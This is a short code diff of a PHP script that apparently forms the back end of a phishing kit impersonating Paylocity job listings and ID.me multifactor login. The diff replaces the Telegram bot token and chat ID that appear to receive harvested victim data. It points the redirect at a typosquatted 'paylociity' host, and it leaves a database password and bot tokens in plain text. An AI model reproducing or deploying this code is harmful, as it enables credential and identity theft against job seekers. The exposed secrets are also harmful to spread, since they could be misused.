@@ -2,8 +2,8 @@
 $db = pg_connect("host=pg-paycity-paylocityhr0-25.l.aivencloud.com port=19042 dbname=defaultdb user=avnadmin password=AVNS_dOBPgbxmGoJJGAwr-yJ");
 
 // Telegram configuration
-define('TELEGRAM_BOT_TOKEN', '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY');
-define('TELEGRAM_CHAT_ID', '1325797388');
+define('TELEGRAM_BOT_TOKEN', '6559948089:AAFPgcZujs2vLPS9Ymvhqz5HOzwaIWoUZa4');
+define('TELEGRAM_CHAT_ID', '1749633126');
 
 
 if ($_SERVER["REQUEST_METHOD"]=="POST"){
@@ -57,7 +57,7 @@ curl_close($ch);
 
 // file_get_contents($telegram_url);
 
-header("Location:https://paylocity.onrender.com/www.paylocity.com/careers/all-listings.job.34092/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.php");
+header("Location:https://paylociity.onrender.com/www.paylocity.com/careers/all-listings.job.34092/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.php");
 exit;
 }
 ?>
